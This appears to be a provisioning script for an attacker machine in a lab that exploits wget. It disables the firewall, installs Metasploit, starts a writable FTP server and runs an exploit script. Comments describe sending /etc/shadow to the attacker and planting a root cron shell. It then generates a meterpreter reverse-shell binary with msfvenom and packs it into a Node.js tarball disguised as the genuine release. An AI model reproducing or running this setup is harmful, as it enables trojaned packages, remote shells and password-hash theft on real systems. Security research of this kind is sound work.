#!/bin/bash
# sudo systemctl stop firewalld
sudo ufw disable

# install essential packages
sudo DEBIAN_FRONTEND=noninteractive apt-get -y update
sudo DEBIAN_FRONTEND=noninteractive apt-get -y install build-essential
sudo DEBIAN_FRONTEND=noninteractive apt-get -y install python-pip python-dev
# install pythonftpdlib package
sudo pip install pyftpdlib
# install Metasploit framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
# creating the .wgetrc file
# /etc/shadow will be sent back to the attacker's server through the post request
# /etc/cron.d/wget-root-shell will be created upon the receive of response from attacker's server
# with content specified by the attacker
rm -rf /tmp/ftptest
mkdir /tmp/ftptest
cd /tmp/ftptest
####################################################################
# copy the Debian package that contains the backdoor to /tmp/ftptest
# cp <PATH_TO_DEBIAN_PACKAGE> /tmp/ftptest
# remove the next line once malicious Debian package is available
#cp /vagrant/provision/ipscan_3.5.5_amd64.deb /tmp/ftptest
cp /vagrant/provision/node-v12.8.1-linux-x64.tar.gz /tmp/ftptest
sudo tar -C /tmp/ftptest --strip-components 1 -xzf node-v12.8.1-linux-x64.tar.gz
rm node-v12.8.1-linux-x64.tar.gz
#wget -O atom.x86_64.rpm https://go.skype.com/skypeforlinux-64.rpm
#wget -nc -O node-v12.8.1-linux-x64.tar.gz https://nodejs.org/dist/v10.16.3/node-v10.16.3-linux-x64.tar.gz
####################################################################
# configure ftp server and starting it in the background
# -m specifies the module name; -p port; -w write access
sudo python -m pyftpdlib -p21 -w &
# wait for fptserver to be started
sleep 5
# in a new directory run web server
rm -rf /tmp/webtest
mkdir /tmp/webtest
cd /tmp/webtest
####################################################################
# put the same but benign Debian package in the directory as a mask
# you may need to change the Debian package if you change
# the malicious Debian package
#wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
#wget https://github.com/atom/atom/releases/download/v1.3.1/atom.x86_64.rpm
wget https://nodejs.org/dist/v12.8.1/node-v12.8.1-linux-x64.tar.gz
cp /vagrant/provision/wget-exploit3.py /tmp/webtest
####################################################################
cp /vagrant/provision/exploit.rc /tmp/ftptest
sudo python3 /tmp/webtest/wget-exploit3.py > /vagrant/data/exploit-output.txt & sleep 1
# Run Metasploit
sudo msfconsole
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.33.3 lport=4444 -f elf > shell.elf
sudo chmod +x shell.elf
sudo mv shell.elf /tmp/ftptest/bin
cd /tmp
sudo tar -czvf node-v12.8.1-linux-x64.tar.gz ftptest
sudo mv node-v12.8.1-linux-x64.tar.gz ftptest
cd /tmp/ftptest
chmod +x exploit.rc
#sudo msfconsole -r exploit.rc
